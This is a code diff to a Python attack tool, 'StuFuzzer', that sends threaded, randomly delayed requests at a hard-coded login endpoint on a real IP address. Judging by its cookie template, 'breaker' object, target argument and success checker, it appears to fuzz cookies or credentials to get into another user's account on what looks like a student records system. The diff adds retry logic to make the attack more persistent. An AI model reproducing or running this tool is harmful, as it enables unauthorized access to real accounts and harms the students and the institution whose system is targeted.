@@ -1,11 +1,18 @@
 # encoding: utf8
-from threading import Thread, Lock, Event
 
-import requests
-from argparse import ArgumentParser
 import base64
 import random as rd
 import time
+from argparse import ArgumentParser
+from threading import Thread, Lock, Event
+
+import requests
+
+from util.helpers import do_with_retry
+from util.logger_router import LoggerRouter
+
+logger = LoggerRouter().getLogger(__name__)
+
 
 class StuFuzzer(object):
     url = 'http://222.194.15.1:7777/pls/wwwbks/bks_login2.login'
@@ -14,8 +21,9 @@ class StuFuzzer(object):
     template_cookie = None
     initialized = Event()
 
-    def __init__(self, template_id, template_pwd, max_sleep=10):
+    def __init__(self, template_id, template_pwd, max_sleep=10, max_retry=50):
         self.max_sleep = max_sleep
+        self.max_retry = max_retry
         if not self.initialized.is_set():
             StuFuzzer.template_data = {'stuid': template_id, 'pwd': template_pwd}
             while True:
@@ -60,7 +68,14 @@ class StuFuzzer(object):
             session = requests.Session()
         for req in composer:
             time.sleep(rd.randint(0, self.max_sleep))
-            resp = session.send(req)
+            resp = do_with_retry(
+                self.max_retry,
+                "Request error, cur_cookie = {}".format(composer.cur_cookie),
+                log=logger,
+                func=session.send,
+                kargs=(req,)
+            )
+            # resp = session.send(req)
             # print('Sent')
             if self.checker(resp):
                 composer.stop = True
@@ -97,7 +112,7 @@ def main(args):
         except Exception:
             pass
 
-        breaker = StuFuzzer(args.login_id, args.login_pwd, args.sleep)
+        breaker = StuFuzzer(args.login_id, args.login_pwd, args.sleep, args.retry)
         breaker.fuzz(
             args.target,
             args.threads,
@@ -125,6 +140,9 @@ def parse_arguments():
                         help='Threads number, default 100', default=100)
     parser.add_argument('-s', '--sleep', metavar='N', type=int,
                         help='Max sleep time, default 10', default=10)
+
+    parser.add_argument('-r', '--retry', metavar='N', type=int,
+                        help='Max retry time, default 50', default=50)
 
     return parser.parse_args()
 
